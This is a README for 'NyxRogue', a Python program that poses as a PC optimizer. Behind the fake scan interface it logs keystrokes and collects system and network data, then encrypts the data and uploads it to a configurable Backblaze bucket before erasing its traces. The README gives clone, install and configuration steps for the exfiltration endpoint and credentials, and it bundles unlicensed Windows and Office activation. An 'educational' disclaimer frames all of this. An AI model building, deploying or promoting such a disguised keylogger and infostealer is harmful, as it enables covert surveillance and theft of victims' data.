# NyxRogue

![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)
![Python](https://img.shields.io/badge/python-3.10%2B-green.svg)
![License](https://img.shields.io/badge/license-MIT-orange.svg)

### 🔒 **A Simulation-Based Educational Tool**

NyxRogue is an **educational project** developed by the [Division of Cyber Anarchy] (**DCA**). This software demonstrates how malicious actors can create seemingly helpful programs to infiltrate systems, collect data, and exploit vulnerabilities.
**The purpose of this project is to raise awareness and promote better cybersecurity practices.**

---

## ⚠️ **Disclaimer**

This project is strictly intended for **educational purposes** and should only be used in controlled environments with explicit consent. Unauthorized use of this software for malicious purposes is **illegal** and punishable under applicable laws. By using this software, you agree to these terms and take full responsibility for your actions.
**The authors disclaim any responsibility for illegal misuse.**

---

## 🌌 **Features**
NyxRogue simulates the functionality of a **system optimizer** while covertly collecting data for analysis. Key features include:

1. **System Information Collection**  
   - Retrieves detailed hardware and software specifications.
   - Detects potential vulnerabilities in the system.

2. **Keystroke Logging**  
   - Captures keyboard input for analysis, encrypted using the **NyxCrypta** library.

3. **Fake Optimization**  
   - Displays a simulated system and network optimization interface to deceive the user.

4. **System Activation**  
   - Through the optimization interface, users can activate **Windows** and **Office** using the publicly available scripts from **[massgrave.dev]**.
 
5. **Data Encryption and Exfiltration**  
   - Encrypts collected data with **public-key cryptography** before sending it to a **Backblaze private bucket**.

6. **Trace Removal**  
   - Deletes all traces of the program after execution, ensuring stealth.

---

## 🛠️ **How It Works**

### 1. **Camouflage**  
NyxRogue is disguised as a PC optimizer with a user-friendly GUI. The interface displays:
   - Fake scans for "temporary files" and "network performance."
   - Simulated results, including fake virus detections and cache cleaning.
   - A button to activate **Windows** and **Office**, leveraging community-contributed scripts.

### 2. **Data Collection**  
While the program is running, it collects:
   - System information (CPU, RAM, disk usage, etc.).
   - Network details (public IP, active connections, etc.).
   - Keystroke logs.

### 3. **Encryption and Upload**  
Collected data is:
   - Encrypted using **NyxCrypta**.
   - Uploaded securely to a private **[Backblaze] bucket**.

### 4. **System Activation**  
NyxRogue integrates scripts from **[massgrave.dev]** to activate Windows and Office directly from the optimizer interface.  
   - **Acknowledgment**: A huge thank you to the contributors of massgrave.dev for their work and dedication.

### 5. **Clean Exit**  
Upon termination, the program removes all local traces, leaving no evidence on the infected system.

---

## 🌟 **How to Use**

1. Clone this repository:  
   ```bash
   git clone https://github.com/Division-of-Cyber-Anarchy/NyxRogue.git
   cd nyxrogue
   ```
2. Install the requirements
   ```bash
   pip install -r requirements.txt
   ```
3. Configure the necessary variables

   Before running **NyxRogue**, you need to configure the following variables:
   - Encryption password:
      - Line 34: Replace ```bash password = "my_strong_password"``` with a strong password of your choice.
      - This password will be used to generate encryption keys via NyxCrypta.
   - Backblaze B2 Storage Details:
      - Line 437: Replace ```bash endpoint = "https://example.backblazeb2.com"``` with the correct endpoint for your bucket.
      - Line 438: Enter your Backblaze ```bash key_id in key_id = "your key_id"```.
      - Line 439: Add your application_key in ```bash application_key = "your app_key"```.
   - Bucket Name:
      - Line 582: Change ```bash bucket_name = "my-bucket-name"``` to match the name of your Backblaze bucket.
4. Run the script:
   ```bash
   python NyxRogue.py
   ```

[massgrave.dev]: <https://massgrave.dev>
[Division of Cyber Anarchy]: <https://github.com/Division-of-Cyber-Anarchy>
[Backblaze]: <https://www.backblaze.com/>
